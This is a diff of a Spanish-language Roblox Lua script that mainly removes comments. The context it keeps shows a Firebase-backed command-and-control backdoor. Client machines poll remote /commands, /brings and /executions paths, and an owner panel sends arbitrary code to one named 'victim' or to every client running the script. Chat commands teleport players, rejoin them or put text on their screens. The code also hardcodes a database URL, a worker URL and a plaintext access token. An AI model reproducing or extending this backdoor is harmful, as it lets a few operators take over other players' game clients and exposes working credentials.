@@ -14,8 +14,7 @@ task.spawn(function()
     local LocalPlayer = Players.LocalPlayer
 
 
-    --  FIREBASE CONFIG
-    -- ========================================
+
     local FIREBASE_URL = "https://admin-reciente-default-rtdb.firebaseio.com"
 
     local ownerIds   = {}
@@ -49,9 +48,7 @@ local currentServerId = game.JobId
         return nil
     end
 
-    -- ========================================
-    -- ✅ AUTO-LIMPIEZA FIREBASE 
-    -- ========================================
+
 local function CleanupOldData(path)
     local data = firebaseRequest("GET", path)
     if not data or type(data) ~= "table" then return end
@@ -60,12 +57,10 @@ local function CleanupOldData(path)
     for key, entry in pairs(data) do
         if type(entry) == "table" then
             if entry.timestamp then
-                -- ✅ entrada directa con timestamp (heartbeats, triggers, brings, executions)
                 if (now - (entry.timestamp or 0)) > maxAge then
                     firebaseRequest("DELETE", path .. "/" .. key)
                 end
             else
-                -- ✅ entrada anidada (commands/{serverId}/{cmdKey}) — un nivel más
                 local allOld = true
                 for subKey, subEntry in pairs(entry) do
                     if type(subEntry) == "table" and subEntry.timestamp then
@@ -76,7 +71,6 @@ local function CleanupOldData(path)
                         end
                     end
                 end
-                -- ✅ si el nodo padre quedó vacío, bórralo también
                 if allOld then
                     firebaseRequest("DELETE", path .. "/" .. key)
                 end
@@ -84,11 +78,7 @@ local function CleanupOldData(path)
         end
     end
 end
-    -- ========================================
-    -- ✅ VERIFICACIÓN TRIPLE: nombre + id + hwid
-    -- ========================================
--- ========================================
-    -- ✅ WHITELIST DESDE PASTEBIN
+
     -- ========================================
 local WORKER_URL = "https://waaaaaa.owomanoxd.workers.dev"
 local WORKER_TOKEN = "tupapijoao"
@@ -200,7 +190,6 @@ if isOwner or isAdmin then
 end)
 
 
--- ✅ Cleanup automático cada 1 minuto (solo owners/admins)
 task.spawn(function()
     local waited = 0
     while not myVerified and waited < 15 do
@@ -233,7 +222,7 @@ end)
     local emoteSyncConnection = nil
     local targetForEmoteSync = nil
     local lastCleanupTime = 0
-    local cleanupInterval = 300 -- ✅ OPTIMIZADO: cada 5 min en lugar de 30s
+    local cleanupInterval = 300 
 
 
     pcall(function()
@@ -263,19 +252,7 @@ end)
 
 
 
-    -- ========================================
-    -- ✅ FIREBASE API CON RATE LIMITING
-    -- ========================================
-   
-    -- ========================================
-    -- ✅ CLEANUP OPTIMIZADO (serializado, cada 5 min)
-    -- ========================================
-  
 
-    -- ✅ Self-heartbeat para owners/admins via Supabase
--- ========================================
-    -- ✅ HEARTBEAT OWNERS/ADMINS (espera verificación)
-    -- ========================================
     task.spawn(function()
         local waited = 0
         while not myVerified and waited < 15 do
@@ -298,9 +275,7 @@ end)
         end
     end)
 
-    -- ========================================
-    -- ✅ SISTEMA ADMINS (via Firebase, solo server actual)
-    -- ========================================
+
 task.spawn(function()
         local waited = 0
         while not myVerified and waited < 15 do
@@ -316,7 +291,7 @@ task.spawn(function()
         task.wait(0.5)
         waited2 = waited2 + 0.5
     end
-    local processedCmds = {} -- ✅ cache anti-duplicados
+    local processedCmds = {} -- cache anti-duplicados
     while true do
         task.wait(1)
         local result = firebaseRequest("GET", "/commands/" .. currentServerId)
@@ -349,7 +324,7 @@ end)
                 task.wait(0.5)
                 waited = waited + 0.5
             end
-            local processedBrings = {} -- ✅ cache anti-duplicados
+            local processedBrings = {} -- cache anti-duplicados
             while true do
                 task.wait(1)
                 local result = firebaseRequest("GET", "/brings/" .. myUserId)
@@ -401,7 +376,7 @@ end)
             end
         end)
 
-    end) -- cierra: if isAdmin and not isOwner
+    end) 
 
     local function GetPlayerByUserId(userId)
         return Players:GetPlayerByUserId(tonumber(userId))
@@ -695,9 +670,7 @@ end)
         end)
     end
 
-    -- ========================================
-    -- CHAT
-    -- ========================================
+
     local function SendChatMessage(message)
         task.wait(0.5)
         local messageSent = false
@@ -737,7 +710,7 @@ end)
         local victimaInput = parts[2] and parts[2]:lower() or nil
         local destinoOMensaje = parts[3] or nil
 
-        -- ✅ "all" como víctima = aplica a TODOS los que tengan el script
+        -
         local isAll = (victimaInput == "all")
         -- Para .m all mensaje → el mensaje empieza en parts[3]
         -- Para .t all joao / .u all joao → destino es parts[3]
@@ -769,7 +742,7 @@ end)
 
         local function MeAfecta()
             if not victimaInput then return true end
-            if isAll then return true end  -- ✅ "all" afecta a todos
+            if isAll then return true end  -- "all" afecta a todos
             if #victimaInput < 3 then return false end
             local myUsername = LocalPlayer.Name:lower()
             local myDisplayName = LocalPlayer.DisplayName:lower()
@@ -826,7 +799,7 @@ end)
                 end
             end
         elseif cmd == ".l" then
-            -- ✅ .l [victima/all] [texto...] — muestra texto en pantalla (CoreGui, sin fondo)
+            -- .l [victima/all] [texto...] — muestra texto en pantalla (CoreGui, sin fondo)
             if MeAfecta() then
                 local textoFinal = ""
                 local startIdx = 3
@@ -984,9 +957,7 @@ elseif cmd == ".rj" then
         end
     end
 
-    -- ========================================
-    -- LISTENERS DE CHAT (sin cambios)
-    -- ========================================
+
     pcall(function()
         local textChannels = TextChatService:FindFirstChild("TextChannels")
         if textChannels then
@@ -1069,14 +1040,7 @@ local senderVerified = (senderRole == "Owner" or senderRole == "Admin")
         end
     end)
 
-    -- ========================================
-    -- ✅ SISTEMA FOLLOWERS OPTIMIZADO
-    -- Lógica:
-    --   · Al inicio chequea si hay owner/admin online (máx 4 GET)
-    --   · Si hay alguien → envía heartbeat cada 8s y escucha comandos
-    --   · Si no hay nadie → solo re-chequea cada 30s (casi sin requests)
-    --   · Owner puede forzar detección poniendo un flag en /presence/trigger
-    -- ========================================
+
 task.spawn(function()
         local waited = 0
         while not myVerified and waited < 20 do
@@ -1090,8 +1054,8 @@ task.spawn(function()
 local followerState = {
             ownerOnline = false,
             lastOnlineCheck = 0,
-            checkInterval = 60,        -- ✅ FIX: aumentado de 30s a 60s (menos requests)
-            heartbeatInterval = 15,    -- ✅ FIX: aumentado de 8s a 15s (menos escrituras)
+            checkInterval = 60,        --  FIX: aumentado de 30s a 60s (menos requests)
+            heartbeatInterval = 15,    -- FIX: aumentado de 8s a 15s (menos escrituras)
             lastHeartbeat = 0,
             lastTriggerCheck = 0,
         }
@@ -1126,15 +1090,15 @@ local function SendHeartbeat()
     followerState.lastHeartbeat = tick()
 end
 
--- ✅ LOOP PRINCIPAL DEL FOLLOWER
+-- 
         task.spawn(function()
-            -- ✅ FIX: Esperar verificación completa (no asumir 2s es suficiente)
+
             local waitedF = 0
             while not myVerified and waitedF < 20 do
                 task.wait(0.5)
                 waitedF = waitedF + 0.5
             end
-            if isOwner or isAdmin then return end  -- ✅ Salida de seguridad
+            if isOwner or isAdmin then return end  --  Salida de seguridad
             task.wait(1)
             followerState.ownerOnline = CheckOwnerOnline()
             followerState.lastOnlineCheck = tick()
@@ -1145,7 +1109,7 @@ end
             while true do
                 local now = tick()
 
-                -- ✅ Chequear trigger del owner cada 2s
+                -- 
                 if (now - followerState.lastTriggerCheck) >= 2 then
                     followerState.lastTriggerCheck = now
                     local ok, trigger = pcall(function()
@@ -1188,14 +1152,12 @@ end
             end
         end)
 
--- ✅ BRINGS via Firebase con verificación triple
--- ✅ BRINGS via Firebase con verificación triple
- -- ✅ BRINGS via Firebase con verificación triple
+
         task.spawn(function()
             local wB = 0
             while not myVerified and wB < 20 do task.wait(0.5) wB = wB + 0.5 end
             if isOwner or isAdmin then return end
-            local processedBrings = {} -- ✅ cache anti-duplicados
+            local processedBrings = {} 
             while true do
                 task.wait(1)
                 local result = firebaseRequest("GET", "/brings/" .. myUserId)
@@ -1223,12 +1185,12 @@ end
                 end
             end
         end)
--- ✅ COMANDOS via Firebase con verificación triple
+-- COMANDOS via Firebase con verificación triple
 task.spawn(function()
     local wC = 0
     while not myVerified and wC < 20 do task.wait(0.5) wC = wC + 0.5 end
     if isOwner or isAdmin then return end
-    local processedCmds = {} -- ✅ cache anti-duplicados
+    local processedCmds = {} --  cache anti-duplicados
     while true do
         task.wait(1)
         local result = firebaseRequest("GET", "/commands/" .. currentServerId)
@@ -1255,7 +1217,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-            -- ✅ FIX: Esperar verificación
+            --
             local wE = 0
             while not myVerified and wE < 20 do task.wait(0.5) wE = wE + 0.5 end
             if isOwner or isAdmin then return end
@@ -1272,7 +1234,7 @@ local shouldExecute = false
                                     local tgt = tostring(execData.target or "")
                                     local srvId = tostring(execData.serverId or "")
                                     if (tgt == ".all" or tgt == ".s") and srvId == currentServerId then
-                                        shouldExecute = true -- ✅ .all ahora también requiere mismo server
+                                        shouldExecute = true --  .all ahora también requiere mismo server
                                     elseif tgt:lower() == LocalPlayer.Name:lower() then
                                         shouldExecute = true
                                     end
@@ -1297,18 +1259,12 @@ end
             end
         end)
 
--- ========================================
-    -- ✅ SISTEMA ADMINS
 
-    end) -- cierra el task.spawn del follower
-    -- ========================================
-    -- ✅ SISTEMA ADMINS
-    -- ========================================
+    end) 
+
   
 
--- ========================================
-    -- UI PARA OWNERS Y ADMINS (sin cambios de layout)
-    -- ========================================
+
     task.spawn(function()
         -- Esperar a que la verificación de Supabase termine (máx 10s)
         local waited = 0
@@ -1828,7 +1784,7 @@ firebaseRequest("PUT", "/brings/" .. tostring(userId) .. "/" .. bringKey, {
             return entry
         end
 
-        -- ✅ Solo muestra jugadores del MISMO servidor que el owner/admin actual
+        --
      local function UpdatePlayersList()
             task.spawn(function()
                 for _, child in ipairs(playersList:GetChildren()) do
@@ -2052,7 +2008,7 @@ end)
 
 
     
-    -- ✅ .rj ejecutado por el owner = se aplica a sí mismo directamente
+    --
     local cmdPrefix = cmd:match("^(%S+)"):lower()
     local victimaArg = cmd:match("%S+%s+(%S+)") and cmd:match("%S+%s+(%S+)"):lower() or nil
     
@@ -2096,7 +2052,7 @@ firebaseRequest("PUT", "/commands/" .. currentServerId .. "/" .. cmdKey, {
     sender_name = LocalPlayer.Name,
     sender_hwid = myHwid,
     sender_role = myRole,
-    server_id   = currentServerId, -- ✅ AGREGADO para doble-verificación
+    server_id   = currentServerId, 
     command     = cmd,
     timestamp   = os.time()
 })
@@ -2354,7 +2310,7 @@ firebaseRequest("PUT", "/executions/owners/" .. myUserId .. "/" .. execId, {
             end
 
 
-            -- ✅ Conexión correcta (única, sin duplicados)
+            
             executeBtn.MouseButton1Click:Connect(function()
                 task.spawn(function()
                     ExecuteRemoteCode(codeInput.Text, targetInput.Text)
@@ -2896,10 +2852,7 @@ local function TeleportToServer(link)
             Position = UDim2.new(0.5, -shadowWidth/2, 0.5, -shadowHeight/2)
         }):Play()
 
-        -- ✅ Cargar lista inicial en background
--- ✅ Cargar lista inicial en background
-        -- ✅ Cargar lista inicial en background
         task.delay(1, UpdatePlayersList)
     -- cierra: if isOwner then (del ExecuteRemoteCode)
-    end) -- cierra el task.spawn de la UI
+    end) 
 end)
